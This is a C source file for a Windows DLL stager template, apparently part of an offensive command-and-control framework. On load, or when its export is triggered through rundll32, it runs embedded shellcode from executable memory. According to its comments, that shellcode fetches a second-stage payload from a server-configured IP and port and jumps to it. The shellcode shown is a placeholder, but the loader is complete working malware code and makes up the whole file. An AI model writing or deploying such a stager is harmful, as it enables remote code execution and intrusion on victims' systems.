/*
 * stager_dll.c — precompiled DLL stager template.
 *
 * Build: gcc -shared -O1 -s -o stager_c_template.dll stager_dll.c
 * (uses a placeholder shellcode blob; the config block inside is patched at
 * generation time by the server, so no recompilation is needed per payload.)
 *
 * On DllMain(PROCESS_ATTACH) a worker thread executes the embedded stager
 * shellcode (fetch stage2 + jump). Exports StartStager() so rundll32
 * `rundll32 stager.dll,StartStager` or a custom loader can trigger it too.
 */

#include <windows.h>

/* Placeholder blob: prologue + stager_main shellcode + sentinel config block.
   Filled in by the template generator; the server patches the 170-byte config
   region (magic+ip4+port2+key32+path128) at payload generation time. */
unsigned char SC[] = {
0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc,
0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc
};

static void run_stager(void) {
    void* m = VirtualAlloc(0, sizeof(SC), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!m) return;
    memcpy(m, SC, sizeof(SC));
    ((void(*)(void))m)();
}

static DWORD WINAPI worker(LPVOID p) {
    (void)p;
    run_stager();
    return 0;
}

__declspec(dllexport) void StartStager(void) {
    HANDLE t = CreateThread(NULL, 0, worker, NULL, 0, NULL);
    if (t) CloseHandle(t);
}

BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
    (void)h; (void)r;
    if (reason == DLL_PROCESS_ATTACH) {
        StartStager();
    }
    return TRUE;
}
